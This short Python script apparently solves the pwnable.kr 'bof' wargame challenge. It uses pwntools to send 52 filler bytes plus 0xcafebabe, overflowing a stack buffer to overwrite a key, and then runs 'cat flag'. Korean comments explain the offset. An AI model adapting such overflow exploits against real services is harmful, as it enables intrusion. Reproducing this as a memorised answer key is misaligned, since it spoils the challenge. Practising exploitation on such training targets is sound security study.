# file: bof_shellcode.py

from pwn import *

r = remote('pwnable.kr', '9000')

# Payload
# Stackframe + Stackframe Pointer + Dummy += Payload
# BOF가 일어난 상태이지만 break point로 stack frame check 함수를 만나지 않아 패닉이 발생하지 않음
# 'A' 문자 52개를 삽입하여 BOF를 발생시키면 key값인 0xdeadbeef를 변조하기 직전까지 갈 수 있다.

pay = b'A' * 0x34
pay += b'\xbe\xba\xfe\xca' # 0xcafebabe

r.sendline(pay)
r.sendline(b'cat flag')

data = r.recv(1024)
print(data)